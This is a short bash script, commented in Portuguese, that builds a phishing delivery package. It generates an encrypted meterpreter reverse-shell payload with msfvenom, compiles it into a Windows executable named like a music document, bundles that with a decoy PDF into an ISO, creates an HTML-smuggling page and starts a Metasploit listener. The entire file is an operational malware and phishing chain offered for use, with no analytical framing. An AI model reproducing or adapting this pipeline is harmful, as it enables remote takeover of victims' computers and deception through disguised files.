#!/bin/bash
set -e

SEED="Medidas_Paco_De_Lucia_Oficial_1971"
LHOST="192.168.122.61"
LPORT="4444"
EXE="Medidas_Paco_De_Lucia_Oficial_1971.exe"

echo "[1/6] Gerando shellcode staged..."
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

echo "[2/6] Criptografando (seed: $SEED)..."
python3 encrypt2.py shellcode.bin "$SEED"

echo "[3/6] Compilando recursos e binário..."
x86_64-w64-mingw32-windres recurso.rc -O coff -o recurso.res
x86_64-w64-mingw32-g++ veneno2.cpp recurso.res -o "$EXE" \
  -s -mwindows -O2 -fno-stack-protector \
  -lkernel32 -luser32 -lshell32 -lgdi32

echo "[4/6] Montando conteúdo do ISO..."
mkdir -p conteudo_iso
cp Medidas_Paco_De_Lucia_Oficial_1971.pdf "conteudo_iso/Medidas_Paco_De_Lucia_Oficial_1971.pdf"
cp "$EXE" conteudo_iso/

echo "[5/6] Gerando ISO..."
genisoimage -V "CONDE_1971" -quiet -o entrega.iso conteudo_iso/

echo "[6/6] Gerando HTML de smuggling..."
python3 generate_smuggling.py

echo "[+] Pronto! Entrega: entrega.iso -> phishing.html"
echo "[+] Listener: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j'"
